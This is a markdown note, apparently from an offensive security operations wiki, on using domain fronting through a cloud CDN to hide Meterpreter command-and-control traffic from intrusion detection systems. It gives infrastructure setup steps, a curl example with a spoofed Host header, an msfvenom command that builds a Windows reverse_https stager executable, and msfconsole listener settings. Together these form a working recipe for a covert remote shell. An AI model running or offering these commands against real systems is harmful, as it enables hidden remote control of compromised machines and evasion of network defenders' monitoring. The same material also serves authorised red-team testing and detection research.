---
title: Meterpreter domain fronting
tags:
  - breach
  - operations
  - domain
  - fronting
  - meterpreter
  - bypass
  - ids
  - ips
---

Domain fronting is a technique we can use to evade an **intrusion detection
system (IDS)** or **intrusion prevention system (IPS)** attempting to block
outbound connections to our **command-and-control (C2)** server(s). This is
accomplished by manipulating the **Host** header for HTTP/S requests, and using
**content distribution networks (CDNs)** to establish legitimate TLS
connections.

## Infrastructure setup

This section is an exercise for the reader, but what we'll be discussing is
getting your hands on some infrastructure. Using various cloud services, like
Amazon Web Services (AWS), Google Cloud Platform (GCP), Microsoft Azure, and
Digital Ocean, we can create hosts necessary for domain fronting. What are the
steps?

First, get a domain and a virtual machine with a valid public IP address. Make
sure your new domain resolves to your virtual machine's public IP address. Make
sure your virtual machine hosting your C2 offers a certificate when HTTPS
connections are established.

Next, create a CDN - you easily do this with a service like Azure. Make sure
your CDN redirects requests to your new domain. The creation of a CDN will
provide you with another domain - likely within the namespace of your cloud
provider. Make sure requests against your CDN aren't cached - you C2 will likely
make a lot of requests.

Congrats! You've done all the hard work.

## Finding a domain

Using the
[FindFrontableDomains](https://github.com/rvrsh3ll/FindFrontableDomains) tool,
we can search for frontable domains within the same cloud provider your CDN is
registered with. Make sure the frontable domain you've selected is within the
same region or availability zone as well, otherwise your requests might get
dropped.

Now with a frontable domain in hand, you can establish HTTP/S connections with
your C2 using your new CDN's domain as the `Host` in your request(s), for
example:

```bash
curl --header "Host: ${CDN_DOMAIN}" "https://${FRONTABLE_DOMAIN}"
```

The above `curl` invocation will establish a TLS session requesting the
frontable domain's certificate, but the underlying HTTPS communication will
request a resource from our CDN. Our CDN will locate and offer the certificate
for the frontable domain, but it will reroute our request to our C2's domain,
allowing us to establish an HTTPS connection.

This technique ultimately allows us to fool any IDS or IPS inspecting our
traffic, as it looks like we're establishing an innocent TLS session with the
frontable domain.

## Meterpreter configuration

The following invocation creates a **meterpreter** stager that uses our domain
fronting infrastructure to smuggle its requests:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${FRONTABLE_DOMAIN} LPORT=443 HttpHostHeader=${CDN_DOMAIN} -f exe > payload.exe
```

The following **msfconsole** configuration will create a listening server that
enables responses for our stager's smuggled HTTPS traffic:

```
msfconsole > set LHOST ${FRONTABLE_DOMAIN}
msfconsole > set OverrideLHOST ${FRONTABLE_DOMAIN}
msfconsole > set OverrideRequestHost true
msfconsole > set HttpHostHeader ${CDN_DOMAIN}
```
